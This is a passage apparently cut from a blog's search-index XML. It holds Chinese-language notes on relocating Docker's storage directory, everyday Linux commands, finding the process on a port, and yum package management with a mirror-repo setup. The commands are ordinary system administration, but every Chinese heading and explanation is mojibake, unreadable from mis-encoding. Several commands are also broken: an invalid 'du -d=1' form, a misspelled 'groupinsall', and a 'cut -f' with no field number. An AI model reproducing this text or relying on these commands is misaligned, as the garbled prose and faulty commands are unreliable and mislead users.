        <content type="html"><![CDATA[<h3 id="Dockerçš„é•œåƒå­˜æ”¾ç›®å½•ä¿®æ”¹ä¸è¿ç§»"><a href="#Dockerçš„é•œåƒå­˜æ”¾ç›®å½•ä¿®æ”¹ä¸è¿ç§»" class="headerlink" title="Dockerçš„é•œåƒå­˜æ”¾ç›®å½•ä¿®æ”¹ä¸è¿ç§»"></a>Dockerçš„é•œåƒå­˜æ”¾ç›®å½•ä¿®æ”¹ä¸è¿ç§»</h3><p>Dockeré•œåƒé»˜è®¤å­˜æ”¾åœ¨<code>/var/lib/docker</code>ï¼Œæœ‰äº›æƒ…å†µä¸‹ç”±äºç³»ç»Ÿç›˜ç©ºé—´ä¸å¤Ÿéœ€è¦å°†é•œåƒè¿ç§»åˆ°å…¶ä»–ç£ç›˜ã€‚</p><h4 id="è½¯è¿æ¥å½¢å¼"><a href="#è½¯è¿æ¥å½¢å¼" class="headerlink" title="è½¯è¿æ¥å½¢å¼"></a>è½¯è¿æ¥å½¢å¼</h4><ol><li>åœæ­¢æœåŠ¡</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker stop</span><br></pre></td></tr></table></figure><ol start="2"><li>ç§»åŠ¨<code>/var/lib/docker</code>åˆ°æ–°ç›®å½•<code>/data/</code>ä¸‹</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /var/lib/docker /data/</span><br></pre></td></tr></table></figure><ol start="3"><li>é‡æ–°å°†<code>/var/lib/docker</code>é“¾æ¥åˆ°<code>/data/docker</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /data/docker /var/lib/docker</span><br></pre></td></tr></table></figure><ol start="4"><li>é‡å¯æœåŠ¡</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure><h4 id="è®¾ç½®DOCKER-PATHç¯å¢ƒå˜é‡æ–¹å¼"><a href="#è®¾ç½®DOCKER-PATHç¯å¢ƒå˜é‡æ–¹å¼" class="headerlink" title="è®¾ç½®DOCKER_PATHç¯å¢ƒå˜é‡æ–¹å¼"></a>è®¾ç½®<code>DOCKER_PATH</code>ç¯å¢ƒå˜é‡æ–¹å¼</h4><p>å‚è€ƒ<a href="https://my.oschina.net/u/2306127/blog/653569">ã€ŠDockerçš„é•œåƒå­˜æ”¾ç›®å½•ä¿®æ”¹ä¸è¿ç§»ã€‹</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-å¸¸ç”¨å‘½ä»¤</title>
      <link href="/post/linux-command.html"/>
      <url>/post/linux-command.html</url>
      
        <content type="html"><![CDATA[<h3 id="Linux-å¸¸ç”¨å‘½ä»¤"><a href="#Linux-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="Linux å¸¸ç”¨å‘½ä»¤"></a>Linux å¸¸ç”¨å‘½ä»¤</h3><h4 id="æŸ¥çœ‹æ–‡ä»¶å¤¹å¤§å°"><a href="#æŸ¥çœ‹æ–‡ä»¶å¤¹å¤§å°" class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶å¤¹å¤§å°"></a>æŸ¥çœ‹æ–‡ä»¶å¤¹å¤§å°</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">du -h --max-depth=1 ~/</span><br><span class="line">du -h -d=1 .</span><br><span class="line"></span><br><span class="line">du -sh file_path</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--max-depthä¸ºæ·±åº¦</span><br><span class="line"></span><br><span class="line">-s, --summarize</span><br><span class="line">    display only a total for each argument</span><br><span class="line"></span><br><span class="line">-h, --human-readable</span><br><span class="line">    print sizes in human readable format (e.g., 1K 234M 2G)</span><br><span class="line"></span><br><span class="line">To check more than one directory and see the total, use du -sch:</span><br><span class="line">-c, --total</span><br><span class="line">    produce a grand total</span><br></pre></td></tr></table></figure><ul><li><a href="https://unix.stackexchange.com/questions/185764/how-do-i-get-the-size-of-a-directory-on-the-command-line">How do I get the size of a directory on the command line?</a></li></ul><h4 id="æŸ¥çœ‹ç£ç›˜ä½¿ç”¨æƒ…å†µ"><a href="#æŸ¥çœ‹ç£ç›˜ä½¿ç”¨æƒ…å†µ" class="headerlink" title="æŸ¥çœ‹ç£ç›˜ä½¿ç”¨æƒ…å†µ"></a>æŸ¥çœ‹ç£ç›˜ä½¿ç”¨æƒ…å†µ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹inodeä½¿ç”¨æƒ…å†µ"><a href="#æŸ¥çœ‹inodeä½¿ç”¨æƒ…å†µ" class="headerlink" title="æŸ¥çœ‹inodeä½¿ç”¨æƒ…å†µ"></a>æŸ¥çœ‹inodeä½¿ç”¨æƒ…å†µ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -i</span><br></pre></td></tr></table></figure><h4 id="åˆ—å‡ºæ–‡ä»¶"><a href="#åˆ—å‡ºæ–‡ä»¶" class="headerlink" title="åˆ—å‡ºæ–‡ä»¶"></a>åˆ—å‡ºæ–‡ä»¶</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. ls -p | grep -v /                                   (without hidden files)</span><br><span class="line">2. ls -l | grep ^- | tr -s &#x27; &#x27; | cut -d &#x27; &#x27; -f 9       (without hidden files)</span><br><span class="line"></span><br><span class="line">a) ls -pa | grep -v /                                  (with hidden files)</span><br><span class="line">b) ls -la | grep ^- | tr -s &#x27; &#x27; | cut -d &#x27; &#x27; -f        (with hidden files)</span><br></pre></td></tr></table></figure><p>List directories only:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. ls -p | grep /                                      (without hidden)</span><br><span class="line">2. ls -l | grep ^d | tr -s &#x27; &#x27; | cut -d &#x27; &#x27; -f 9       (without hidden)</span><br><span class="line"></span><br><span class="line">a) ls -pa | grep /                                     (with hidden)</span><br><span class="line">b) ls -l | grep ^d | tr -s &#x27; &#x27; | cut -d &#x27; &#x27; -f 9       (with hidden)</span><br></pre></td></tr></table></figure><p>grep -v -e ^$ is to remove blank lines from the result.</p><h4 id="Argument-list-too-long-é”™è¯¯"><a href="#Argument-list-too-long-é”™è¯¯" class="headerlink" title="Argument list too long é”™è¯¯"></a>Argument list too long é”™è¯¯</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find src -name &#x27;*.*&#x27; -exec mv &#123;&#125; dest \;</span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹å†…æ ¸åŠå‘è¡Œç‰ˆ"><a href="#æŸ¥çœ‹å†…æ ¸åŠå‘è¡Œç‰ˆ" class="headerlink" title="æŸ¥çœ‹å†…æ ¸åŠå‘è¡Œç‰ˆ"></a>æŸ¥çœ‹å†…æ ¸åŠå‘è¡Œç‰ˆ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><h4 id="æ–‡ä»¶åˆ†å‰²"><a href="#æ–‡ä»¶åˆ†å‰²" class="headerlink" title="æ–‡ä»¶åˆ†å‰²"></a>æ–‡ä»¶åˆ†å‰²</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">split [-bl] file [prefix]  </span><br><span class="line">-b, --bytes=SIZEï¼šå¯¹fileè¿›è¡Œåˆ‡åˆ†ï¼Œæ¯ä¸ªå°æ–‡ä»¶å¤§å°ä¸ºSIZEã€‚å¯ä»¥æŒ‡å®šå•ä½b,k,mã€‚</span><br><span class="line">-C, --line-bytes=SIZE   è®¾ç½®è¾“å‡ºæ–‡ä»¶çš„æœ€å¤§è¡Œæ•°ã€‚ä¸ -b ç±»ä¼¼ï¼Œä½†ä¼šå°½é‡ç»´æŒæ¯è¡Œçš„å®Œæ•´æ€§</span><br><span class="line">-l, --lines=NUMBERï¼šå¯¹fileè¿›è¡Œåˆ‡åˆ†ï¼Œæ¯ä¸ªæ–‡ä»¶æœ‰NUMBERè¡Œã€‚</span><br><span class="line">-a, --suffix-length=N   ä½¿ç”¨é•¿åº¦ä¸º N çš„åç¼€ (é»˜è®¤ 2)</span><br><span class="line">-d, --numeric-suffixes  ä½¿ç”¨æ•°å­—åç¼€ä»£æ›¿å­—æ¯</span><br><span class="line">prefixï¼šåˆ†å‰²åäº§ç”Ÿçš„æ–‡ä»¶åå‰ç¼€ã€‚</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ¯1000è¡Œåˆ‡å‰²æˆä¸€ä¸ªæ–‡ä»¶</span></span><br><span class="line">split -l 1000 urls.txt url_</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æ¯100Måˆ‡å‰²æˆä¸€ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨æ•°å­—ä½œä¸ºåç¼€ï¼Œåç¼€é•¿åº¦4ä½</span></span><br><span class="line">split es.tar.gz -b 100m -a 4 -d es.tar.gz_</span><br></pre></td></tr></table></figure><h4 id="è¯»å–æ–‡ä»¶Nè¡Œ"><a href="#è¯»å–æ–‡ä»¶Nè¡Œ" class="headerlink" title="è¯»å–æ–‡ä»¶Nè¡Œ"></a>è¯»å–æ–‡ä»¶Nè¡Œ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ç¬¬äºŒè¡Œåˆ°æœ€åä¸€è¡Œ</span></span><br><span class="line">sed -n &#x27;2,$p&#x27; file</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ç¬¬äºŒè¡Œåˆ°ç¬¬100è¡Œ</span></span><br><span class="line">sed -n &#x27;2,100p&#x27; file</span><br></pre></td></tr></table></figure><h4 id="echo-è¾“å‡ºè½¬ä¹‰å­—ç¬¦"><a href="#echo-è¾“å‡ºè½¬ä¹‰å­—ç¬¦" class="headerlink" title="echo è¾“å‡ºè½¬ä¹‰å­—ç¬¦"></a>echo è¾“å‡ºè½¬ä¹‰å­—ç¬¦</h4><p>é»˜è®¤<code>echo</code>çš„è¾“å‡ºæ˜¯ä¸è½¬ä¹‰çš„ã€‚ä½¿ç”¨<code>-e</code>å¯ä»¥å®ç°è½¬ä¹‰ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;ç¬¬ä¸€è¡Œ\nç¬¬äºŒè¡Œ&quot;</span><br></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾å’Œåˆ é™¤å¤±æ•ˆçš„è½¯é“¾æ¥"><a href="#æŸ¥æ‰¾å’Œåˆ é™¤å¤±æ•ˆçš„è½¯é“¾æ¥" class="headerlink" title="æŸ¥æ‰¾å’Œåˆ é™¤å¤±æ•ˆçš„è½¯é“¾æ¥"></a>æŸ¥æ‰¾å’Œåˆ é™¤å¤±æ•ˆçš„è½¯é“¾æ¥</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥æ‰¾å½“å‰ç›®å½•</span><br><span class="line">find -L -type l</span><br><span class="line">å¤åˆ¶ä»£ç </span><br><span class="line">æŸ¥æ‰¾æŒ‡å®šç›®å½•</span><br><span class="line">find -L ur_path -type l</span><br><span class="line">å¤åˆ¶ä»£ç </span><br><span class="line">åˆ é™¤</span><br><span class="line">find -L ur_path -type l -delete</span><br><span class="line">å¤åˆ¶ä»£ç </span><br></pre></td></tr></table></figure><h4 id="æŸ¥çœ‹æ–‡ä»¶ç¼–ç "><a href="#æŸ¥çœ‹æ–‡ä»¶ç¼–ç " class="headerlink" title="æŸ¥çœ‹æ–‡ä»¶ç¼–ç "></a>æŸ¥çœ‹æ–‡ä»¶ç¼–ç </h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file --mime-encoding [filename]</span><br></pre></td></tr></table></figure><h4 id="ç”ŸæˆæŒ‡å®šå¤§å°æ–‡ä»¶"><a href="#ç”ŸæˆæŒ‡å®šå¤§å°æ–‡ä»¶" class="headerlink" title="ç”ŸæˆæŒ‡å®šå¤§å°æ–‡ä»¶"></a>ç”ŸæˆæŒ‡å®šå¤§å°æ–‡ä»¶</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate -s 50M 50M.file</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/zero of=50M.file bs=1M count=50</span><br></pre></td></tr></table></figure><h4 id="ç½‘å¡æµé‡åˆ†æ"><a href="#ç½‘å¡æµé‡åˆ†æ" class="headerlink" title="ç½‘å¡æµé‡åˆ†æ"></a>ç½‘å¡æµé‡åˆ†æ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sar -n DEV 2 10 æ¯2ç§’åˆ·æ–°ä¸€æ¬¡ï¼Œå…±10æ¬¡</span><br></pre></td></tr></table></figure><h4 id="å®½å£ä½¿ç”¨æŸ¥çœ‹"><a href="#å®½å£ä½¿ç”¨æŸ¥çœ‹" class="headerlink" title="å®½å£ä½¿ç”¨æŸ¥çœ‹"></a>å®½å£ä½¿ç”¨æŸ¥çœ‹</h4><p><a href="/2016/11/08/linux-%E7%AB%AF%E5%8F%A3/">linux ç«¯å£</a></p><h4 id="è¿›ç¨‹æ£€æŸ¥"><a href="#è¿›ç¨‹æ£€æŸ¥" class="headerlink" title="è¿›ç¨‹æ£€æŸ¥"></a>è¿›ç¨‹æ£€æŸ¥</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">PID=$$ # $BASHPID</span><br><span class="line"></span><br><span class="line">if kill -0 $PID 2&gt;/dev/null; then </span><br><span class="line">    echo &quot;process $PID existence&quot; </span><br><span class="line">else </span><br><span class="line">    echo &quot;process $PID nexistence&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h4 id="fuser"><a href="#fuser" class="headerlink" title="fuser"></a>fuser</h4><p>fuser 1080&#x2F;tcp<br>fuser -k 1080&#x2F;tcp<br>fkill</p><h4 id="pidstat"><a href="#pidstat" class="headerlink" title="pidstat"></a>pidstat</h4><h4 id="æµ‹è¯•ç£ç›˜IO"><a href="#æµ‹è¯•ç£ç›˜IO" class="headerlink" title="æµ‹è¯•ç£ç›˜IO"></a>æµ‹è¯•ç£ç›˜IO</h4>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>linux-ç«¯å£</title>
      <link href="/post/linux-port-command.html"/>
      <url>/post/linux-port-command.html</url>
      
        <content type="html"><![CDATA[<h3 id="Linuxå¹³å°æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ"><a href="#Linuxå¹³å°æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ" class="headerlink" title="Linuxå¹³å°æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ"></a>Linuxå¹³å°æŸ¥çœ‹ç«¯å£å ç”¨æƒ…å†µ</h3><ol><li><p><code>netstat -nlp | grep :80</code></p></li><li><p><code>lsof -i :80 | grep LISTEN</code><br> <code>yum install lsof</code></p></li><li><p><code>fuser 8080/tcp</code><br> <code>fuser -k 8080/tcp</code> ä¼šæ€æ­»è¿™ä¸ªè¿›ç¨‹</p></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://unix.stackexchange.com/questions/106561/finding-the-pid-of-the-process-using-a-specific-port">Finding the PID of the process using a specific port?</a></li><li><a href="https://stackoverflow.com/questions/11583562/how-to-kill-a-process-running-on-particular-port-in-linux">How to kill a process running on particular port in Linux?</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>yum.md</title>
      <link href="/post/yum.html"/>
      <url>/post/yum.html</url>
      
        <content type="html"><![CDATA[<h3 id="YUM"><a href="#YUM" class="headerlink" title="YUM"></a>YUM</h3><p>yumå‘½ä»¤è½¯ä»¶åŒ…ç®¡ç† yumå‘½ä»¤æ˜¯åœ¨Fedoraå’ŒRedHatä»¥åŠSUSEä¸­åŸºäºrpmçš„è½¯ä»¶åŒ…ç®¡ç†å™¨ï¼Œå®ƒå¯ä»¥ä½¿ç³»ç»Ÿç®¡ç†äººå‘˜äº¤äº’å’Œè‡ªåŠ¨åŒ–åœ°æ›´ç»†ä¸ç®¡ç†RPMè½¯ä»¶åŒ…ï¼Œèƒ½å¤Ÿä»æŒ‡å®šçš„æœåŠ¡å™¨è‡ªåŠ¨ä¸‹è½½RPMåŒ…å¹¶ä¸”å®‰è£…ï¼Œå¯ä»¥è‡ªåŠ¨å¤„ç†ä¾èµ–æ€§å…³ç³»ï¼Œå¹¶ä¸”ä¸€æ¬¡å®‰è£…æ‰€æœ‰ä¾èµ–çš„è½¯ä½“åŒ…ï¼Œæ— é¡»ç¹çåœ°ä¸€æ¬¡æ¬¡ä¸‹è½½ã€å®‰è£…ã€‚</p><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum (é€‰é¡¹) (å‚æ•°)</span><br></pre></td></tr></table></figure><h3 id="é€‰é¡¹"><a href="#é€‰é¡¹" class="headerlink" title="é€‰é¡¹"></a>é€‰é¡¹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-hï¼šæ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ï¼›</span><br><span class="line">-yï¼šå¯¹æ‰€æœ‰çš„æé—®éƒ½å›ç­”â€œyesâ€ï¼›</span><br><span class="line">-cï¼šæŒ‡å®šé…ç½®æ–‡ä»¶ï¼›</span><br><span class="line">-qï¼šå®‰é™æ¨¡å¼ï¼›</span><br><span class="line">-vï¼šè¯¦ç»†æ¨¡å¼ï¼›</span><br><span class="line">-dï¼šè®¾ç½®è°ƒè¯•ç­‰çº§ï¼ˆ0-10ï¼‰ï¼›</span><br><span class="line">-eï¼šè®¾ç½®é”™è¯¯ç­‰çº§ï¼ˆ0-10ï¼‰ï¼›</span><br><span class="line">-Rï¼šè®¾ç½®yumå¤„ç†ä¸€ä¸ªå‘½ä»¤çš„æœ€å¤§ç­‰å¾…æ—¶é—´ï¼›</span><br><span class="line">-Cï¼šå®Œå…¨ä»ç¼“å­˜ä¸­è¿è¡Œï¼Œè€Œä¸å»ä¸‹è½½æˆ–è€…æ›´æ–°ä»»ä½•å¤´æ–‡ä»¶</span><br></pre></td></tr></table></figure><h3 id="å‚æ•°"><a href="#å‚æ•°" class="headerlink" title="å‚æ•°"></a>å‚æ•°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">installï¼šå®‰è£…rpmè½¯ä»¶åŒ…ï¼›</span><br><span class="line">updateï¼šæ›´æ–°rpmè½¯ä»¶åŒ…ï¼›</span><br><span class="line">check-updateï¼šæ£€æŸ¥æ˜¯å¦æœ‰å¯ç”¨çš„æ›´æ–°rpmè½¯ä»¶åŒ…ï¼›</span><br><span class="line">removeï¼šåˆ é™¤æŒ‡å®šçš„rpmè½¯ä»¶åŒ…ï¼›</span><br><span class="line">listï¼šæ˜¾ç¤ºè½¯ä»¶åŒ…çš„ä¿¡æ¯ï¼›</span><br><span class="line">searchï¼šæ£€æŸ¥è½¯ä»¶åŒ…çš„ä¿¡æ¯ï¼›</span><br><span class="line">infoï¼šæ˜¾ç¤ºæŒ‡å®šçš„rpmè½¯ä»¶åŒ…çš„æè¿°ä¿¡æ¯å’Œæ¦‚è¦ä¿¡æ¯ï¼›</span><br><span class="line">cleanï¼šæ¸…ç†yumè¿‡æœŸçš„ç¼“å­˜ï¼›</span><br><span class="line">makecacheï¼šç”Ÿæˆç¼“å­˜ï¼›</span><br><span class="line">shellï¼šè¿›å…¥yumçš„shellæç¤ºç¬¦ï¼›</span><br><span class="line">resolvedepï¼šæ˜¾ç¤ºrpmè½¯ä»¶åŒ…çš„ä¾èµ–å…³ç³»ï¼›</span><br><span class="line">localinstallï¼šå®‰è£…æœ¬åœ°çš„rpmè½¯ä»¶åŒ…ï¼›</span><br><span class="line">localupdateï¼šæ˜¾ç¤ºæœ¬åœ°rpmè½¯ä»¶åŒ…è¿›è¡Œæ›´æ–°ï¼›</span><br><span class="line">deplistï¼šæ˜¾ç¤ºrpmè½¯ä»¶åŒ…çš„æ‰€æœ‰ä¾èµ–å…³ç³»ã€‚</span><br></pre></td></tr></table></figure><h3 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h3><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install #å…¨éƒ¨å®‰è£…</span><br><span class="line">yum install package1 #å®‰è£…æŒ‡å®šçš„å®‰è£…åŒ…package1</span><br><span class="line">yum groupinsall group1 #å®‰è£…ç¨‹åºç»„group1</span><br></pre></td></tr></table></figure><h4 id="æ›´æ–°å’Œå‡çº§"><a href="#æ›´æ–°å’Œå‡çº§" class="headerlink" title="æ›´æ–°å’Œå‡çº§"></a>æ›´æ–°å’Œå‡çº§</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum update #å…¨éƒ¨æ›´æ–°</span><br><span class="line">yum update package1 #æ›´æ–°æŒ‡å®šç¨‹åºåŒ…package1</span><br><span class="line">yum check-update #æ£€æŸ¥å¯æ›´æ–°çš„ç¨‹åº</span><br><span class="line">yum upgrade package1 #å‡çº§æŒ‡å®šç¨‹åºåŒ…package1</span><br><span class="line">yum groupupdate group1 #å‡çº§ç¨‹åºç»„group1</span><br></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾å’Œæ˜¾ç¤º"><a href="#æŸ¥æ‰¾å’Œæ˜¾ç¤º" class="headerlink" title="æŸ¥æ‰¾å’Œæ˜¾ç¤º"></a>æŸ¥æ‰¾å’Œæ˜¾ç¤º</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yum info package1 #æ˜¾ç¤ºå®‰è£…åŒ…ä¿¡æ¯package1</span><br><span class="line">yum list #æ˜¾ç¤ºæ‰€æœ‰å·²ç»å®‰è£…å’Œå¯ä»¥å®‰è£…çš„ç¨‹åºåŒ…</span><br><span class="line">yum list package1 #æ˜¾ç¤ºæŒ‡å®šç¨‹åºåŒ…å®‰è£…æƒ…å†µpackage1</span><br><span class="line">yum groupinfo group1 #æ˜¾ç¤ºç¨‹åºç»„group1ä¿¡æ¯</span><br><span class="line">yum search string #æ ¹æ®å…³é”®å­—stringæŸ¥æ‰¾å®‰è£…åŒ…</span><br></pre></td></tr></table></figure><h4 id="åˆ é™¤ç¨‹åº"><a href="#åˆ é™¤ç¨‹åº" class="headerlink" title="åˆ é™¤ç¨‹åº"></a>åˆ é™¤ç¨‹åº</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yum remove package1 #åˆ é™¤ç¨‹åºåŒ…package1</span><br><span class="line">yum groupremove group1 #åˆ é™¤ç¨‹åºç»„group1</span><br><span class="line">yum deplist package1 #æŸ¥çœ‹ç¨‹åºpackage1ä¾èµ–æƒ…å†µ æ¸…é™¤ç¼“å­˜</span><br><span class="line">yum clean packages #æ¸…é™¤ç¼“å­˜ç›®å½•ä¸‹çš„è½¯ä»¶åŒ…</span><br><span class="line">yum clean headers #æ¸…é™¤ç¼“å­˜ç›®å½•ä¸‹çš„ headers</span><br><span class="line">yum clean oldheaders #æ¸…é™¤ç¼“å­˜ç›®å½•ä¸‹æ—§çš„ headers</span><br></pre></td></tr></table></figure><h3 id="æ¸…é™¤ç¼“å­˜"><a href="#æ¸…é™¤ç¼“å­˜" class="headerlink" title="æ¸…é™¤ç¼“å­˜"></a>æ¸…é™¤ç¼“å­˜</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum clean packages #æ¸…é™¤ç¼“å­˜ç›®å½•ä¸‹çš„è½¯ä»¶åŒ…</span><br><span class="line">yum clean headers #æ¸…é™¤ç¼“å­˜ç›®å½•ä¸‹çš„ headers</span><br><span class="line">yum clean oldheaders #æ¸…é™¤ç¼“å­˜ç›®å½•ä¸‹æ—§çš„ headers</span><br></pre></td></tr></table></figure><h3 id="ä»…ä¸‹è½½"><a href="#ä»…ä¸‹è½½" class="headerlink" title="ä»…ä¸‹è½½"></a>ä»…ä¸‹è½½</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum --downloadonly --downloaddir=. install  java-1.8.0-openjdk  java-1.8.0-openjdk-devel -y</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å·²å®‰è£…æ—¶</span></span><br><span class="line">yum --downloadonly --downloaddir=. reinstall package_name -y</span><br></pre></td></tr></table></figure><h3 id="é…ç½®æº"><a href="#é…ç½®æº" class="headerlink" title="é…ç½®æº"></a>é…ç½®æº</h3><h4 id="é…ç½®é˜¿é‡Œæº"><a href="#é…ç½®é˜¿é‡Œæº" class="headerlink" title="é…ç½®é˜¿é‡Œæº"></a>é…ç½®é˜¿é‡Œæº</h4><p>1ã€å¤‡ä»½</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><br></pre></td></tr></table></figure><p>2ã€ä¸‹è½½æ–°çš„CentOS-Base.repo åˆ°&#x2F;etc&#x2F;yum.repos.d&#x2F; CentOS 5</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo</span><br></pre></td></tr></table></figure><p>CentOS 6</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 